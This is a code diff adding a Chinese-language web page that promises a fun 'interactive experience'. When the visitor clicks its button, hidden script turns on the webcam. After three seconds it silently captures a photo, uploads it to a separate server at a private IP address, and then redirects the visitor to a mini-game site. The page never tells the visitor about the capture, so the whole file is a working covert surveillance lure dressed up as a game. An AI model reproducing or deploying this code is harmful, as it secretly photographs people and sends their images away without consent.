@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>发现有趣的互动体验！</title>
+    <style>
+        /* 页面基础样式 */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+
+        /* 隐藏视频和 Canvas 元素 */
+        #video, #canvas {
+            display: none; /* 隐藏视频和 Canvas 元素 */
+        }
+
+        /* 按钮样式 */
+        #startButton {
+            padding: 15px 30px;
+            font-size: 20px;
+            cursor: pointer;
+            background-color: #ff6347;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            margin-top: 20px;
+            transition: background-color 0.3s ease;
+        }
+
+        #startButton:hover {
+            background-color: #e55337;
+        }
+
+        /* 说明文字样式 */
+        .description {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        /* 加载动画样式 */
+        .loader {
+            border: 16px solid #f3f3f3; /* Light grey */
+            border-top: 16px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            display: none; /* 初始状态隐藏 */
+            margin-top: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- 用户点击按钮后启动摄像头 -->
+    <div class="description">准备好进入一个有趣的互动体验了吗？点击下方按钮！</div>
+    <button id="startButton">进入体验</button>
+    <div class="loader"></div>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // 启动摄像头
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play();
+                    };
+                    video.addEventListener('loadeddata', () => {
+                        console.log('视频数据已加载');
+                        setTimeout(captureAndUpload, 3000); // 延迟3秒以确保视频流完全加载
+                    });
+                })
+                .catch(error => {
+                    console.error('无法访问摄像头:', error);
+                    hideLoading(); // 在发生错误时隐藏加载动画
+                    redirectToGame(); // 发生错误时也跳转到游戏页面
+                });
+        }
+
+        // 捕捉和上传图像
+        function captureAndUpload() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            const context = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            console.log('视频尺寸:', canvas.width, 'x', canvas.height);
+
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                if (!blob) {
+                    console.error('Canvas toBlob 失败');
+                    hideLoading(); // 在转换失败时隐藏加载动画
+                    redirectToGame(); // 转换失败时也跳转到游戏页面
+                    return;
+                }
+
+                const formData = new FormData();
+                formData.append('photo', blob, 'photo.png');
+
+                fetch('http://192.168.64.148:60607/upload-photo', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(() => {
+                    redirectToGame(); // 上传成功后跳转到小游戏网站
+                })
+                .catch(error => {
+                    console.error('照片上传失败:', error);
+                    redirectToGame(); // 即使上传失败也跳转
+                })
+                .finally(() => {
+                    hideLoading(); // 无论上传成功还是失败，都隐藏加载动画
+                });
+            }, 'image/png');
+        }
+
+        // 隐藏加载动画
+        function hideLoading() {
+            document.querySelector('.loader').style.display = 'none';
+        }
+
+        // 跳转到小游戏网站
+        function redirectToGame() {
+            window.location.href = 'https://mininng.github.io/AusitM0ge/80h5/';
+        }
+
+        // 初始化事件监听器
+        document.getElementById('startButton').addEventListener('click', function() {
+            this.style.display = 'none'; // 隐藏按钮
+            document.querySelector('.loader').style.display = 'block'; // 显示加载动画
+            startCamera(); // 启动摄像头
+        });
+    </script>
+</body>
+</html>
